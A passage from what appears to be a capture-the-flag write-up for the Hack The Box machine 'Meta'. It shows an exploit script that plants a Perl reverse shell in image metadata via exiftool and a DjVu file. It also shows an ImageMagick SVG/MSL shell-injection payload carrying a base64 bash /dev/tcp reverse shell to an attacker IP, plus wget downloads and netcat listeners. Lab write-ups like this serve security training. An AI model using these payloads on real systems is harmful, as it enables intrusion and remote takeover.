<span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span> <span class="o">+</span> <span class="n">base64</span><span class="p">.</span><span class="nf">b64encode</span><span class="p">(</span> <span class="sa">f</span><span class="s">"use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));if(connect(S,sockaddr_in(</span><span class="si">{</span><span class="n">port</span><span class="si">}</span><span class="s">,inet_aton('</span><span class="si">{</span><span class="n">ip</span><span class="si">}</span><span class="s">'))));"</span><span class="p">.</span><span class="nf">encode</span><span class="p">()</span> <span class="p">)</span>

<span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span> <span class="o">+</span> <span class="sa">b</span><span class="s">"'))};</span><span class="se">\"</span><span class="s">)"</span>


<span class="n">payload_file</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="s">'payload'</span><span class="p">,</span> <span class="s">'w'</span><span class="p">)</span>
<span class="n">payload_file</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="n">payload</span><span class="p">.</span><span class="nf">decode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">))</span>
<span class="n">payload_file</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>


<span class="n">subprocess</span><span class="p">.</span><span class="nf">run</span><span class="p">([</span><span class="s">'bzz'</span><span class="p">,</span> <span class="s">'payload'</span><span class="p">,</span> <span class="s">'payload.bzz'</span><span class="p">])</span>
<span class="n">subprocess</span><span class="p">.</span><span class="nf">run</span><span class="p">([</span><span class="s">'djvumake'</span><span class="p">,</span> <span class="s">'exploit.djvu'</span><span class="p">,</span> <span class="s">"INFO=1,1"</span><span class="p">,</span> <span class="s">'BGjp=/dev/null'</span><span class="p">,</span> <span class="s">'ANTz=payload.bzz'</span><span class="p">])</span>
<span class="n">subprocess</span><span class="p">.</span><span class="nf">run</span><span class="p">([</span><span class="s">'exiftool'</span><span class="p">,</span> <span class="s">'-config'</span><span class="p">,</span> <span class="s">'configfile'</span><span class="p">,</span> <span class="s">'-HasselbladExif&lt;=exploit.djvu'</span><span class="p">,</span> <span class="s">'image.jpg'</span><span class="p">])</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Running the script the image is getting updated with the payload.</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="err">$</span> <span class="n">python3</span> <span class="n">exploit</span><span class="mf">.</span><span class="n">py</span>
    <span class="mi">1</span> <span class="n">image</span> <span class="n">files</span> <span class="n">updated</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Now we just have to set up a listener on the port we specified and upload the generated image to the website.</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre><span class="err">$</span> <span class="n">nc</span> <span class="o">-</span><span class="n">lnvp</span> <span class="mi">7575</span>
<span class="nc">Ncat</span><span class="o">:</span> <span class="nc">Version</span> <span class="mf">7.92</span> <span class="p">(</span> <span class="n">https</span><span class="o">://</span><span class="n">nmap</span><span class="mf">.</span><span class="n">org</span><span class="o">/</span><span class="n">ncat</span> <span class="p">)</span>
<span class="nc">Ncat</span><span class="o">:</span> <span class="nc">Listening</span> <span class="n">on</span> <span class="o">:::</span><span class="mi">7575</span>
<span class="nc">Ncat</span><span class="o">:</span> <span class="nc">Listening</span> <span class="n">on</span> <span class="mf">0.0.0.0</span><span class="o">:</span><span class="mi">7575</span>
</pre></td></tr></tbody></table></code></div></div>

<p><a href="/img/meta/025_upload_image.png"><img data-src="/img/meta/025_upload_image.png" alt="025_upload_image" data-proofer-ignore></a></p>

<p>After we click the upload button the page hangs and we get a connection back on our ncat listener as www-data which we upgrade using python and fix the terminal size.</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre></td><td class="rouge-code"><pre><span class="err">$</span> <span class="n">nc</span> <span class="o">-</span><span class="n">lnvp</span> <span class="mi">7575</span>
<span class="nc">Ncat</span><span class="o">:</span> <span class="nc">Version</span> <span class="mf">7.92</span> <span class="p">(</span> <span class="n">https</span><span class="o">://</span><span class="n">nmap</span><span class="mf">.</span><span class="n">org</span><span class="o">/</span><span class="n">ncat</span> <span class="p">)</span>
<span class="nc">Ncat</span><span class="o">:</span> <span class="nc">Listening</span> <span class="n">on</span> <span class="o">:::</span><span class="mi">7575</span>
<span class="nc">Ncat</span><span class="o">:</span> <span class="nc">Listening</span> <span class="n">on</span> <span class="mf">0.0.0.0</span><span class="o">:</span><span class="mi">7575</span>
<span class="nc">Ncat</span><span class="o">:</span> <span class="nc">Connection</span> <span class="n">from</span> <span class="mf">10.129.166.252.</span>
<span class="nc">Ncat</span><span class="o">:</span> <span class="nc">Connection</span> <span class="n">from</span> <span class="mf">10.129.166.252</span><span class="o">:</span><span class="mf">43968.</span>
<span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">sh</span><span class="o">:</span> <span class="mi">0</span><span class="o">:</span> <span class="n">can</span><span class="s1">'t access tty; job control turned off
$ python3 -c '</span><span class="n">import</span> <span class="n">pty</span><span class="p">;</span><span class="n">pty</span><span class="mf">.</span><span class="nf">spawn</span><span class="p">(</span><span class="s2">"/bin/bash"</span><span class="p">)</span><span class="err">'</span>
<span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="o">@</span><span class="n">meta</span><span class="o">:/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">dev01</span><span class="mf">.</span><span class="n">artcorp</span><span class="mf">.</span><span class="n">htb</span><span class="o">/</span><span class="n">metaview</span><span class="err">$</span> <span class="n">export</span> <span class="no">TERM</span><span class="o">=</span><span class="n">xterm</span>
<span class="n">export</span> <span class="no">TERM</span><span class="o">=</span><span class="n">xterm</span>
<span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="o">@</span><span class="n">meta</span><span class="o">:/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">dev01</span><span class="mf">.</span><span class="n">artcorp</span><span class="mf">.</span><span class="n">htb</span><span class="o">/</span><span class="n">metaview</span><span class="err">$</span> <span class="o">^</span><span class="nc">Z</span>
<span class="p">[</span><span class="mi">1</span><span class="p">]</span>  <span class="o">+</span> <span class="mi">43617</span> <span class="n">suspended</span>  <span class="n">nc</span> <span class="o">-</span><span class="n">lnvp</span> <span class="mi">7575</span>
<span class="err">$</span> <span class="n">stty</span> <span class="n">raw</span> <span class="o">-</span><span class="k">echo</span><span class="p">;</span><span class="n">fg</span>
<span class="p">[</span><span class="mi">1</span><span class="p">]</span>  <span class="o">+</span> <span class="mi">43617</span> <span class="n">continued</span>  <span class="n">nc</span> <span class="o">-</span><span class="n">lnvp</span> <span class="mi">7575</span>

<span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="o">@</span><span class="n">meta</span><span class="o">:/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">dev01</span><span class="mf">.</span><span class="n">artcorp</span><span class="mf">.</span><span class="n">htb</span><span class="o">/</span><span class="n">metaview</span><span class="err">$</span>
</pre></td></tr></tbody></table></code></div></div>

<h2 id="imagemagick"><span class="mr-2">ImageMagick</span><a href="#imagemagick" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>Taking a look around on the system and monitoring for running processes there seems to be a cronjob being run by the user thomas who has the uid of 1000.</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre><span class="mi">2022</span><span class="o">/</span><span class="mo">01</span><span class="o">/</span><span class="mi">22</span> <span class="mi">17</span><span class="o">:</span><span class="mi">13</span><span class="o">:</span><span class="mo">01</span> <span class="no">CMD</span><span class="o">:</span> <span class="no">UID</span><span class="o">=</span><span class="mi">0</span>    <span class="no">PID</span><span class="o">=</span><span class="mi">1441</span>   <span class="o">|</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="no">CRON</span> <span class="o">-</span><span class="n">f</span>
<span class="mi">2022</span><span class="o">/</span><span class="mo">01</span><span class="o">/</span><span class="mi">22</span> <span class="mi">17</span><span class="o">:</span><span class="mi">13</span><span class="o">:</span><span class="mo">01</span> <span class="no">CMD</span><span class="o">:</span> <span class="no">UID</span><span class="o">=</span><span class="mi">1000</span> <span class="no">PID</span><span class="o">=</span><span class="mi">1442</span>   <span class="o">|</span> <span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">bash</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">convert_images</span><span class="mf">.</span><span class="n">sh</span>
<span class="mi">2022</span><span class="o">/</span><span class="mo">01</span><span class="o">/</span><span class="mi">22</span> <span class="mi">17</span><span class="o">:</span><span class="mi">13</span><span class="o">:</span><span class="mo">01</span> <span class="no">CMD</span><span class="o">:</span> <span class="no">UID</span><span class="o">=</span><span class="mi">1000</span> <span class="no">PID</span><span class="o">=</span><span class="mi">1444</span>   <span class="o">|</span> <span class="n">pkill</span> <span class="n">mogrify</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Checking the script it cdâ€™s into the directory <code class="language-plaintext highlighter-rouge">/var/www/dev01.artcorp.htb/convert_images</code> and then calls <code class="language-plaintext highlighter-rouge">/usr/local/bin/mogrify</code> on all files machting <code class="language-plaintext highlighter-rouge">*.*</code> with an output format of png.</p>

<p><code class="language-plaintext highlighter-rouge">/usr/local/bin/convert_images.sh</code></p>
<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre><span class="c1">#!/bin/bash</span>
<span class="n">cd</span> <span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">dev01</span><span class="mf">.</span><span class="n">artcorp</span><span class="mf">.</span><span class="n">htb</span><span class="o">/</span><span class="n">convert_images</span><span class="o">/</span> <span class="o">&amp;&amp;</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">mogrify</span> <span class="o">-</span><span class="n">format</span> <span class="n">png</span> <span class="o">*.*</span> <span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="kc">null</span>
<span class="n">pkill</span> <span class="n">mogrify</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Taking a closer look at the mogrify it is actually a symlink to <code class="language-plaintext highlighter-rouge">magick</code> which is part of ImageMagick.</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="o">@</span><span class="n">meta</span><span class="o">:/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">dev01</span><span class="mf">.</span><span class="n">artcorp</span><span class="mf">.</span><span class="n">htb</span><span class="o">/</span><span class="n">metaview</span><span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">la</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">mogrify</span>
<span class="n">lrwxrwxrwx</span> <span class="mi">1</span> <span class="n">root</span> <span class="n">root</span> <span class="mi">6</span> <span class="nc">Aug</span> <span class="mi">29</span> <span class="mi">15</span><span class="o">:</span><span class="mi">59</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">mogrify</span> <span class="o">-&gt;</span> <span class="n">magick</span>
</pre></td></tr></tbody></table></code></div></div>

<p>To check for possible CVEâ€™s in ImageMagick we need the version number first.</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="o">@</span><span class="n">meta</span><span class="o">:/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">dev01</span><span class="mf">.</span><span class="n">artcorp</span><span class="mf">.</span><span class="n">htb</span><span class="o">/</span><span class="n">metaview</span><span class="err">$</span> <span class="n">mogrify</span> <span class="o">--</span><span class="n">version</span>
<span class="nc">Version</span><span class="o">:</span> <span class="nc">ImageMagick</span> <span class="mf">7.0.10</span><span class="o">-</span><span class="mi">36</span> <span class="no">Q16</span> <span class="n">x86_64</span> <span class="mi">2021</span><span class="o">-</span><span class="mi">08</span><span class="o">-</span><span class="mi">29</span> <span class="n">https</span><span class="o">://</span><span class="n">imagemagick</span><span class="mf">.</span><span class="n">org</span>
<span class="nc">Copyright</span><span class="o">:</span> <span class="err">Â©</span> <span class="mi">1999</span><span class="o">-</span><span class="mi">2020</span> <span class="nc">ImageMagick</span> <span class="nc">Studio</span> <span class="no">LLC</span>
<span class="nc">License</span><span class="o">:</span> <span class="n">https</span><span class="o">://</span><span class="n">imagemagick</span><span class="mf">.</span><span class="n">org</span><span class="o">/</span><span class="n">script</span><span class="o">/</span><span class="n">license</span><span class="mf">.</span><span class="n">php</span>
<span class="nc">Features</span><span class="o">:</span> <span class="nc">Cipher</span> <span class="no">DPC</span> <span class="no">HDRI</span> <span class="nf">OpenMP</span><span class="p">(</span><span class="mf">4.5</span><span class="p">)</span>
<span class="nf">Delegates</span> <span class="p">(</span><span class="n">built</span><span class="o">-</span><span class="n">in</span><span class="p">)</span><span class="o">:</span> <span class="n">fontconfig</span> <span class="n">freetype</span> <span class="n">jng</span> <span class="n">jpeg</span> <span class="n">png</span> <span class="n">x</span> <span class="n">xml</span> <span class="n">zlib</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Looking the version up on google we are able to find a <a href="https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html">PoC</a> which should work with the installed version of ImageMagick. The PoC abuses the the authentication mechanism for password protected PDFâ€™s to pass additional shell commands. To abuse this we first we generate a base64 encoded  reverse shell payload.</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="err">$</span> <span class="k">echo</span> <span class="o">-</span><span class="n">n</span> <span class="s1">'bash -c "bash -i &gt;&amp;/dev/tcp/10.10.14.73/7575 0&gt;&amp;1"'</span> <span class="o">|</span> <span class="n">base64</span>
<span class="nc">YmFzaCAtYyAiYmFzaCAtaSA</span><span class="o">+</span><span class="nc">Ji9kZXYvdGNwLzEwLjEwLjE0LjczLzc1NzUgMD4mMSI</span><span class="o">=</span>
</pre></td></tr></tbody></table></code></div></div>

<p>We then take the <code class="language-plaintext highlighter-rouge">poc.svg</code> from the blogpost and exchange the payload with our reverse shell.</p>

<p><code class="language-plaintext highlighter-rouge">poc.svg</code></p>
<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="rouge-code"><pre><span class="nt">&lt;image</span> <span class="na">authenticate=</span><span class="s">'ff" `echo -n YmFzaCAtYyAiYmFzaCAtaSA+Ji9kZXYvdGNwLzEwLjEwLjE0LjczLzc1NzUgMD4mMSI= | base64 -d | bash`;"'</span><span class="nt">&gt;</span>
  <span class="nt">&lt;read</span> <span class="na">filename=</span><span class="s">"pdf:/etc/passwd"</span><span class="nt">/&gt;</span>
  <span class="nt">&lt;get</span> <span class="na">width=</span><span class="s">"base-width"</span> <span class="na">height=</span><span class="s">"base-height"</span> <span class="nt">/&gt;</span>
  <span class="nt">&lt;resize</span> <span class="na">geometry=</span><span class="s">"400x400"</span> <span class="nt">/&gt;</span>
  <span class="nt">&lt;write</span> <span class="na">filename=</span><span class="s">"test.png"</span> <span class="nt">/&gt;</span>
  <span class="nt">&lt;svg</span> <span class="na">width=</span><span class="s">"700"</span> <span class="na">height=</span><span class="s">"700"</span> <span class="na">xmlns=</span><span class="s">"http://www.w3.org/2000/svg"</span> <span class="na">xmlns:xlink=</span><span class="s">"http://www.w3.org/1999/xlink"</span><span class="nt">&gt;</span>
  <span class="nt">&lt;image</span> <span class="na">xlink:href=</span><span class="s">"msl:poc.svg"</span> <span class="na">height=</span><span class="s">"100"</span> <span class="na">width=</span><span class="s">"100"</span><span class="nt">/&gt;</span>
  <span class="nt">&lt;/svg&gt;</span>
<span class="nt">&lt;/image&gt;</span>
</pre></td></tr></tbody></table></code></div></div>

<p>All we have to do now is to set up a ncat listener and to drop the file in the <code class="language-plaintext highlighter-rouge">/var/www/dev01.artcorp.htb/convert_images</code> on the target machine.</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre><span class="n">nc</span> <span class="o">-</span><span class="n">lnvp</span> <span class="mi">7575</span>
<span class="nc">Ncat</span><span class="o">:</span> <span class="nc">Version</span> <span class="mf">7.92</span> <span class="p">(</span> <span class="n">https</span><span class="o">://</span><span class="n">nmap</span><span class="mf">.</span><span class="n">org</span><span class="o">/</span><span class="n">ncat</span> <span class="p">)</span>
<span class="nc">Ncat</span><span class="o">:</span> <span class="nc">Listening</span> <span class="n">on</span> <span class="o">:::</span><span class="mi">7575</span>
<span class="nc">Ncat</span><span class="o">:</span> <span class="nc">Listening</span> <span class="n">on</span> <span class="mf">0.0.0.0</span><span class="o">:</span><span class="mi">757</span>
</pre></td></tr></tbody></table></code></div></div>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre></td><td class="rouge-code"><pre><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="o">@</span><span class="n">meta</span><span class="o">:/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">dev01</span><span class="mf">.</span><span class="n">artcorp</span><span class="mf">.</span><span class="n">htb</span><span class="o">/</span><span class="n">convert_images</span><span class="err">$</span> <span class="n">wget</span> <span class="mf">10.10.14.73</span><span class="o">/</span><span class="n">poc</span><span class="mf">.</span><span class="n">svg</span> <span class="o">-</span><span class="nc">O</span> <span class="n">poc</span><span class="mf">.</span><span class="n">svg</span>
<span class="o">--</span><span class="mi">2022</span><span class="o">-</span><span class="mo">01</span><span class="o">-</span><span class="mi">22</span> <span class="mi">17</span><span class="o">:</span><span class="mi">18</span><span class="o">:</span><span class="mi">46</span><span class="o">--</span>  <span class="n">http</span><span class="o">://</span><span class="mf">10.10.14.73</span><span class="o">/</span><span class="n">poc</span><span class="mf">.</span><span class="n">svg</span>
<span class="nc">Connecting</span> <span class="n">to</span> <span class="mf">10.10.14.73</span><span class="o">:</span><span class="mf">80...</span> <span class="n">connected</span><span class="mf">.</span>
<span class="no">HTTP</span> <span class="n">request</span> <span class="n">sent</span><span class="p">,</span> <span class="n">awaiting</span> <span class="n">response</span><span class="mf">...</span> <span class="mi">200</span> <span class="no">OK</span>
<span class="nc">Length</span><span class="o">:</span> <span class="mi">475</span> <span class="p">[</span><span class="n">image</span><span class="o">/</span><span class="n">svg</span><span class="o">+</span><span class="n">xml</span><span class="p">]</span>
<span class="nc">Saving</span> <span class="n">to</span><span class="o">:</span> <span class="err">â€˜</span><span class="n">poc</span><span class="mf">.</span><span class="n">svg</span><span class="err">â€™</span>

<span class="n">poc</span><span class="mf">.</span><span class="n">svg</span>                                                     <span class="mi">100</span><span class="o">%</span><span class="p">[</span><span class="o">==========================================================================================================================================&gt;</span><span class="p">]</span>     <span class="mi">475</span>  <span class="o">--.-</span><span class="no">KB</span><span class="o">/</span><span class="n">s</span>    <span class="n">in</span> <span class="mi">0</span><span class="n">s</span>

<span class="mi">2022</span><span class="o">-</span><span class="mo">01</span><span class="o">-</span><span class="mi">22</span> <span class="mi">17</span><span class="o">:</span><span class="mi">18</span><span class="o">:</span><span class="mi">46</span> <span class="p">(</span><span class="mf">55.3</span> <span class="no">MB</span><span class="o">/</span><span class="n">s</span><span class="p">)</span> <span class="o">-</span> <span class="err">â€˜</span><span class="n">poc</span><span class="mf">.</span><span class="n">svg</span><span class="err">â€™</span> <span class="n">saved</span> <span class="p">[</span><span class="mi">475</span><span class="o">/</span><span class="mi">475</span><span class="p">]</span>

<span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="o">@</span><span class="n">meta</span><span class="o">:/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">dev01</span><span class="mf">.</span><span class="n">artcorp</span><span class="mf">.</span><span class="n">htb</span><span class="o">/</span><span class="n">convert_images</span><span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">la</span>
<span class="n">total</span> <span class="mi">12</span>
<span class="n">drwxrwxr</span><span class="o">-</span><span class="n">x</span> <span class="mi">2</span> <span class="n">root</span>     <span class="n">www</span><span class="o">-</span><span class="n">data</span> <span class="mi">4096</span> <span class="nc">Jan</span> <span class="mi">22</span> <span class="mi">17</span><span class="o">:</span><span class="mi">18</span> <span class="mf">.</span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">4</span> <span class="n">root</span>     <span class="n">root</span>     <span class="mi">4096</span> <span class="nc">Oct</span> <span class="mi">18</span> <span class="mi">14</span><span class="o">:</span><span class="mi">27</span> <span class="mf">..</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">www</span><span class="o">-</span><span class="n">data</span> <span class="n">www</span><span class="o">-</span><span class="n">data</span>  <span class="mi">475</span> <span class="nc">Jan</span> <span class="mi">22</span> <span class="mi">15</span><span class="o">:</span><span class="mi">08</span> <span class="n">poc</span><span class="mf">.</span><span class="n">svg</span>
</pre></td></tr></tbody></table></code></div></div>

<p>After some time we get a connection back as thomas and are able to read the user flag.</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre></td><td class="rouge-code"><pre><span class="err">$</span> <span class="n">nc</span> <span class="o">-</span><span class="n">lnvp</span> <span class="mi">7575</span>
<span class="nc">Ncat</span><span class="o">:</span> <span class="nc">Version</span> <span class="mf">7.92</span> <span class="p">(</span> <span class="n">https</span><span class="o">://</span><span class="n">nmap</span><span class="mf">.</span><span class="n">org</span><span class="o">/</span><span class="n">ncat</span> <span class="p">)</span>
<span class="nc">Ncat</span><span class="o">:</span> <span class="nc">Listening</span> <span class="n">on</span> <span class="o">:::</span><span class="mi">7575</span>
<span class="nc">Ncat</span><span class="o">:</span> <span class="nc">Listening</span> <span class="n">on</span> <span class="mf">0.0.0.0</span><span class="o">:</span><span class="mi">7575</span>
<span class="nc">Ncat</span><span class="o">:</span> <span class="nc">Connection</span> <span class="n">from</span> <span class="mf">10.129.166.252.</span>
<span class="nc">Ncat</span><span class="o">:</span> <span class="nc">Connection</span> <span class="n">from</span> <span class="mf">10.129.166.252</span><span class="o">:</span><span class="mf">43978.</span>
<span class="n">bash</span><span class="o">:</span> <span class="n">cannot</span> <span class="n">set</span> <span class="n">terminal</span> <span class="n">process</span> <span class="nf">group</span> <span class="p">(</span><span class="mi">1533</span><span class="p">)</span><span class="o">:</span> <span class="nc">Inappropriate</span> <span class="n">ioctl</span> <span class="k">for</span> <span class="n">device</span>
<span class="n">bash</span><span class="o">:</span> <span class="n">no</span> <span class="n">job</span> <span class="n">control</span> <span class="n">in</span> <span class="n">this</span> <span class="n">shell</span>
<span class="n">thomas</span><span class="o">@</span><span class="n">meta</span><span class="o">:/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">dev01</span><span class="mf">.</span><span class="n">artcorp</span><span class="mf">.</span><span class="n">htb</span><span class="o">/</span><span class="n">convert_images</span><span class="err">$</span> <span class="n">python3</span> <span class="o">-</span><span class="n">c</span> <span class="s1">'import pty;pty.spawn("/bin/bash")'</span>
<span class="o">&lt;</span><span class="n">ges</span><span class="err">$</span> <span class="n">python3</span> <span class="o">-</span><span class="n">c</span> <span class="s1">'import pty;pty.spawn("/bin/bash")'</span>
<span class="n">thomas</span><span class="o">@</span><span class="n">meta</span><span class="o">:/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">dev01</span><span class="mf">.</span><span class="n">artcorp</span><span class="mf">.</span><span class="n">htb</span><span class="o">/</span><span class="n">convert_images</span><span class="err">$</span> <span class="n">export</span> <span class="no">TERM</span><span class="o">=</span><span class="n">xterm</span>
<span class="n">export</span> <span class="no">TERM</span><span class="o">=</span><span class="n">xterm</span>
<span class="n">thomas</span><span class="o">@</span><span class="n">meta</span><span class="o">:/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">dev01</span><span class="mf">.</span><span class="n">artcorp</span><span class="mf">.</span><span class="n">htb</span><span class="o">/</span><span class="n">convert_images</span><span class="err">$</span> <span class="o">^</span><span class="nc">Z</span>
<span class="p">[</span><span class="mi">1</span><span class="p">]</span>  <span class="o">+</span> <span class="mi">45412</span> <span class="n">suspended</span>  <span class="n">nc</span> <span class="o">-</span><span class="n">lnvp</span> <span class="mi">7575</span>
<span class="err">$</span> <span class="n">stty</span> <span class="n">raw</span> <span class="o">-</span><span class="k">echo</span><span class="p">;</span><span class="n">fg</span>
<span class="p">[</span><span class="mi">1</span><span class="p">]</span>  <span class="o">+</span> <span class="mi">45412</span> <span class="n">continued</span>  <span class="n">nc</span> <span class="o">-</span><span class="n">lnvp</span> <span class="mi">7575</span>
                                                       <span class="o">^</span><span class="nc">C</span>
<span class="n">thomas</span><span class="o">@</span><span class="n">meta</span><span class="o">:/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">dev01</span><span class="mf">.</span><span class="n">artcorp</span><span class="mf">.</span><span class="n">htb</span><span class="o">/</span><span class="n">convert_images</span><span class="err">$</span> <span class="n">stty</span> <span class="n">rows</span> <span class="mi">57</span> <span class="n">cols</span> <span class="mi">239</span>
<span class="n">thomas</span><span class="o">@</span><span class="n">meta</span><span class="o">:/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">dev01</span><span class="mf">.</span><span class="n">artcorp</span><span class="mf">.</span><span class="n">htb</span><span class="o">/</span><span class="n">convert_images</span><span class="err">$</span> <span class="n">wc</span> <span class="o">-</span><span class="n">c</span> <span class="o">~/</span><span class="n">user</span><span class="mf">.</span><span class="n">txt</span>
<span class="mi">33</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">thomas</span><span class="o">/</span><span class="n">user</span><span class="mf">.</span><span class="n">txt</span>
</pre></td></tr></tbody></table></code></div></div>

<h1 id="root">Root</h1>

